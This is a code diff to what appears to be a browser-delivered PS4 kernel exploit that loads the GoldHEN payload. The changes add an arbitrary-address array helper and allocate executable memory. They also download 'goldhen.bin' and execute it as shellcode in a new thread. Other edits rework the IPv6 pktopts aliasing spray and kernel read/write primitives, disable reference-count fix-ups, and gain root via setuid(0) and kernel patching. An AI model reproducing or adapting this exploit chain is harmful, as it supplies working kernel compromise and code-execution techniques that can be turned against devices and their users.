@@ -77,30 +77,63 @@ function malloc32(sz) {
         ptr.backing = new Uint32Array(backing.buffer);
         return ptr;
     }
+    
+function array_from_address(addr, size) {
+   var og_array = new Uint32Array(0x1000);
+    var og_array_i = mem.addrof(og_array).add(0x10);
+    mem.write64(og_array_i, addr);
+    mem.write32(og_array_i.add(0x8), size);
+    mem.write32(og_array_i.add(0xC), 0x1);
+    nogc.push(og_array);
+    return og_array;
+}
 
 function toogle_payload() {
-    window.pld_size = new Int(0x26200000, 0x9);
+const PROT_READ = 1;
+const PROT_WRITE = 2;
+const PROT_EXEC = 4;
 
-    var payload_buffer = chain.sysp('mmap', window.pld_size, 0x300000, 7, 0x41000, -1, 0);
-    var payload = window.pld;
-    var bufLen = payload.length * 4
-    var payload_loader = malloc32(bufLen);
-    var loader_writer = payload_loader.backing;
-    for (var i = 0; i < payload.length; i++) {
-        loader_writer[i] = payload[i];
-    }
-    chain.sys('mprotect', payload_loader, bufLen, (0x1 | 0x2 | 0x4));
-    var pthread = malloc(0x10);
+var loader_addr = chain.sysp(
+  'mmap',
+  new Int(0, 0),                         
+  0x1000,                               
+  PROT_READ | PROT_WRITE | PROT_EXEC,    
+  0x41000,                              
+  -1,
+  0
+);
 
+ var tmpStubArray = array_from_address(loader_addr, 1);
+ tmpStubArray[0] = 0x00C3E7FF;
+
+ var req = new XMLHttpRequest();
+ req.responseType = "arraybuffer";
+ req.open('GET','goldhen.bin');
+ req.send();
+ req.onreadystatechange = function () {
+  if (req.readyState == 4) {
+   var PLD = req.response;
+   var payload_buffer = chain.sysp('mmap', 0, 0x300000, 7, 0x41000, -1, 0);
+   var pl = array_from_address(payload_buffer, PLD.byteLength*4);
+   var padding = new Uint8Array(4 - (req.response.byteLength % 4) % 4);
+   var tmp = new Uint8Array(req.response.byteLength + padding.byteLength);
+   tmp.set(new Uint8Array(req.response), 0);
+   tmp.set(padding, req.response.byteLength);
+   var shellcode = new Uint32Array(tmp.buffer);
+   pl.set(shellcode,0);
+   var pthread = malloc(0x10);
+   
     call_nze(
         'pthread_create',
         pthread,
         0,
-        payload_loader,
+        loader_addr,
         payload_buffer,
-    );
-    localStorage.passcount = ++localStorage.passcount;window.passCounter.innerHTML=localStorage.passcount;
-    EndTimer();
+    );	
+   }
+ };
+ localStorage.passcount = ++localStorage.passcount;window.passCounter.innerHTML=localStorage.passcount;
+ EndTimer();
 }
 
 // sys/socket.h
@@ -1000,6 +1033,10 @@ function make_aliased_pktopts(sds) {
     const tclass = new Word();
     for (let loop = 0; loop < num_alias; loop++) {
         for (let i = 0; i < num_sds; i++) {
+            setsockopt(sds[i], IPPROTO_IPV6, IPV6_2292PKTOPTIONS, 0, 0);
+        }
+
+        for (let i = 0; i < num_sds; i++) {
             tclass[0] = i;
             ssockopt(sds[i], IPPROTO_IPV6, IPV6_TCLASS, tclass);
         }
@@ -1024,12 +1061,8 @@ function make_aliased_pktopts(sds) {
                 return pair;
             }
         }
-
-        for (let i = 0; i < num_sds; i++) {
-            setsockopt(sds[i], IPPROTO_IPV6, IPV6_2292PKTOPTIONS, 0, 0);
-        }
     }
-    localStorage.failcount = ++localStorage.failcount;window.failCounter.innerHTML=localStorage.failcount; 
+    localStorage.failcount = ++localStorage.failcount;window.failCounter.innerHTML=localStorage.failcount;
     die('failed to make aliased pktopts');
 }
 
@@ -1470,16 +1503,6 @@ function make_kernel_arw(pktopts_sds, dirty_sd, k100_addr, kernel_addr, sds) {
             gsockopt(this.worker_sd, IPPROTO_IPV6, IPV6_PKTINFO, buf);
         }
 
-        read8(addr) {
-            this._read(addr);
-            return this.rw_buf.read8(0);
-        }
-
-        read16(addr) {
-            this._read(addr);
-            return this.rw_buf.read16(0);
-        }
-
         read32(addr) {
             this._read(addr);
             return this.rw_buf.read32(0);
@@ -1488,16 +1511,6 @@ function make_kernel_arw(pktopts_sds, dirty_sd, k100_addr, kernel_addr, sds) {
         read64(addr) {
             this._read(addr);
             return this.rw_buf.read64(0);
-        }
-
-        write8(addr, value) {
-            this.rw_buf.write8(0, value);
-            this.copyin(this.rw_buf.addr, addr, 1);
-        }
-
-        write16(addr, value) {
-            this.rw_buf.write16(0, value);
-            this.copyin(this.rw_buf.addr, addr, 2);
         }
 
         write32(addr, value) {
@@ -1531,13 +1544,13 @@ function make_kernel_arw(pktopts_sds, dirty_sd, k100_addr, kernel_addr, sds) {
      kmem.write64(w_rthdr_p, 0);
      log('corrupt pointers cleaned');
 
-    
+    /*
     // REMOVE once restore kernel is ready for production
     // increase the ref counts to prevent deallocation
     kmem.write32(main_sock, kmem.read32(main_sock) + 1);
     kmem.write32(worker_sock, kmem.read32(worker_sock) + 1);
     // +2 since we have to take into account the fget_write()'s reference
-    kmem.write32(pipe_file.add(0x28), kmem.read32(pipe_file.add(0x28)) + 2);
+    kmem.write32(pipe_file.add(0x28), kmem.read32(pipe_file.add(0x28)) + 2);*/
     
     return [kbase, kmem, p_ucred, [kpipe, pipe_save, pktinfo_p, w_pktinfo]];
 }
@@ -1657,7 +1670,7 @@ async function patch_kernel(kbase, kmem, p_ucred, restore_info) {
     sysi('setuid', 0);
     showMessage("GoldHen Loaded Successfully !..."),    
     log('kernel exploit succeeded!');
-    setTimeout(toogle_payload, 1500);
+    toogle_payload();
     //alert("kernel exploit succeeded!");
 }
 
@@ -1791,5 +1804,4 @@ export async function kexploit() {
         close(sd);
     }
 }
-kexploit();
-//setTimeout(kexploit, 1500);
+setTimeout(kexploit, 1500);
